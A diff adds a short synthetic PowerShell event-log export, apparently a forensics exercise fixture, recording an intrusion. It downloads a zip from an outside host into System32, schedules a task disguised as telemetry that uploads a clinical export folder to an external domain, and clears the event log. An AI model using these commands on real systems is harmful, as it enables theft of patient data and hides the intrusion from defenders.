@@ -1,0 +1,7 @@
+# Microsoft-Windows-PowerShell/Operational (export sintético)
+2025-08-28T02:11:12-03:00 | 4103 | Executando: $url = 'https://cloudbox-cdn.net/cli/win64.zip'
+2025-08-28T02:11:12-03:00 | 4104 | Invocando: Invoke-WebRequest -Uri https://cloudbox-cdn.net/cli/win64.zip -OutFile "$env:TEMP\cbx.zip"
+2025-08-28T02:11:34-03:00 | 4103 | Expand-Archive -Path "$env:TEMP\cbx.zip" -DestinationPath "C:\Windows\System32"
+2025-08-28T02:11:55-03:00 | 4103 | New-ScheduledTaskTrigger -Daily -At 02:15
+2025-08-28T02:12:02-03:00 | 4103 | SCHTASKS /Create /SC DAILY /TN "\System\UpdateTelemetry" /TR "C:\Windows\System32\cbxsync.exe --headless --dest uploader-edge.io --path C:\Clinico\Export" /ST 02:15
+2025-08-28T02:12:22-03:00 | 4103 | wevtutil cl "Microsoft-Windows-PowerShell/Operational"  # tentativa de limpeza
